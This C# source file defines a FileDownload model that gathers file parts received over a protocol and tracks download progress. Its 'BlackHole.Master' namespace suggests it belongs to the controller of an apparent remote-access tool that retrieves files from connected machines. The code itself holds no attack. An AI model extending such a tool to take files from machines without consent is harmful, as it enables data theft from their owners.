using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master.Model
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileDownload : INotifyPropertyChanged
    {
        public const int BUFFER_INITIAL_CAPACITY = 1024;

        /// <summary>
        /// 
        /// </summary>
        public event PropertyChangedEventHandler PropertyChanged;
        public void NotifyPropertyChange(string propertyName)
        {
            var handler = PropertyChanged;
            if (handler != null)
                handler(this, new PropertyChangedEventArgs(propertyName));
        }

        /// <summary>
        /// 
        /// </summary>
        public int Id
        {
            get;
            private set;
        }
        
        /// <summary>
        /// 
        /// </summary>
        public string FilePath
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string Name => Path.GetFileName(FilePath);

        /// <summary>
        /// 
        /// </summary>
        public int Progress
        {
            get { return m_progress; }
            set
            {
                m_progress = value;
                NotifyPropertyChange("Progress");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        public bool DownloadCompleted
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public List<byte> RawFile
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private int m_progress;
        

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        public FileDownload(int id, string path)
        {            
            Id = id;
            FilePath = path;
            Progress = 0;
            RawFile = new List<byte>(BUFFER_INITIAL_CAPACITY);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        public void OnPartDownloaded(DownloadedFilePartMessage downloadedPart)
        {
            if (downloadedPart == null)
                return;

            if (downloadedPart.Id != Id)
                return;

            RawFile.AddRange(downloadedPart.RawPart);
            DownloadCompleted = downloadedPart.CurrentPart == downloadedPart.TotalPart;
            Progress = ((downloadedPart.CurrentPart + 1) * 100) / Math.Max(downloadedPart.TotalPart, 1);
        }
    }
}
